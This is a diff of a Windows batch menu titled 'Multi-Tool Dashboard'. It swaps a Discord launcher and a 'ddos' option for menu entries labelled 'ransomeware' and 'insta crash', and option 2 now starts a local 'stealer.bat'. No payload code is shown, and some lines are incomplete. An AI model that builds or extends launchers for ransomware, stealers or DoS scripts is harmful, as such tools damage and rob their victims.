@@ -8,15 +8,14 @@ cls
 echo ╔═══════════════════════════════════════════════╗
 echo ║ Multi-Tool Dashboard ║
 echo ║ ║
-echo ║ 1. start discord ║
-echo ║ 2. ddos (aka kill wi fi or something) ║
-echo ║ 3  get others IP (wifi ip) does not work ║
+echo ║ 1. soon.
+echo ║ 2. ransomeware (takes a bit)  ║
+echo ║ 3  insta crash  ║
 echo ║ 4. exit ║
-echo ║ 5. page 3 ║
 echo ╚═══════════════════════════════════════════════╝
 echo
 set /p choice=start here:
-if "%choice%"=="1" start C:\Users\caner\AppData\Local\Discord\app-1.0.9212/discord.exe
+if "%choice%"=="1" 
 if "%choice%"=="4" exit 
-if "%choice%"=="2" start "" "C:\Users\caner\OneDrive\Desktop\The Tool\the Stuff/ddos.bat"
-if "%choice%"=="5" start "" "C:\Users\caner\OneDrive\Desktop\The Tool\the Stuff/page 3.bat"
+if "%choice%"=="3" start "" ""
+if "%choice%"=="2" start "" "C:\Users\caner\OneDrive\Desktop\The Tool\the Stuff/stealer.bat"
